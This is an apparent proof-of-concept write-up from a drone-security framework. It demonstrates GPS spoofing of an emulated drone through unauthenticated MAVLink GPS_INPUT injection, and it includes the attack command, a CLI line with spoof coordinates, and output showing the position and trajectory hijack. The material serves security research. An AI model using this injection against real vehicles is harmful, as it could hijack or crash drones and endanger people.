# PoC 04 — GPS Spoofing (virtual / local)

**PWNUAV stages:** NV-01 (GPS spoofing) · IM-03 (trajectory hijack) · IM-02 (failsafe)
**Mode:** Local / virtual (no radio) · **venv:** `.venv`

## What it demonstrates
By poisoning the position perception (injecting `GPS_INPUT`), the drone adopts forged coordinates and "believes" it is thousands of km away. The virtual equivalent of an L1 RF overdrive (which would need an instrumented GPS receiver, not available without UART).

## How it works
1. The emulated drone (DroneStub) is brought up over UDP and its real reported position is read.
2. The displacement to force (haversine) toward the target is computed.
3. Forged `GPS_INPUT` messages are injected (3D fix, 12 sats).
4. The reported GLOBAL_POSITION_INT is observed jumping to the forged coordinates.

## Command (input)
```
$ python attacks/04-gps-spoof/gps_spoof_local.py
```
Equivalent CLI against SITL/stub: `pwnuav-gps-spoof --connect udpout:127.0.0.1:14550 --lat 6.2518 --lon -75.5636 --alt 1500`

## Real output
```
========== PWNUAV GPS SPOOFING (virtual) ==========
[*] Baseline position (real): lat 37.774900  lon -122.419400
[*] Spoof target            : lat 6.251800  lon -75.563600  alt 1500 m
[*] Displacement to force   : ~5,876 km

[NV-01] Injecting forged GPS_INPUT  (fix_type=3 3D, sats=12, hdop=1.0) ...
        MAVLink GPS_INPUT: gps_id=0 ignore_flags=0 lat/lon=deg*1e7 alt=m

[*] Reported GLOBAL_POSITION_INT after injection:
   t+ 0.0s  lat   37.774900  lon  -122.419400   
   t+ 0.0s  lat   37.774900  lon  -122.419400   
   t+ 0.0s  lat   37.774900  lon  -122.419400   
   t+ 0.1s  lat    6.251800  lon   -75.563600   <- ADOPTED

[IM-03] EKF/home now believe the vehicle is ~5,876 km away.
[IM-02] In flight this trips the GPS/geofence failsafe -> RTL / trajectory hijack.
[+] POSITION HIJACKED with a single unauthenticated GPS_INPUT.
```

## Interpretation
- The reported position jumps from San Francisco to Medellin (~5,876 km) after a single injection (NV-01).
- In flight, that jump trips the GPS/geofence failsafe → RTL or trajectory hijack (IM-02/03).

## Safety
It is virtual (does not radiate). A real L1 overdrive would be illegal over the air: cage only.
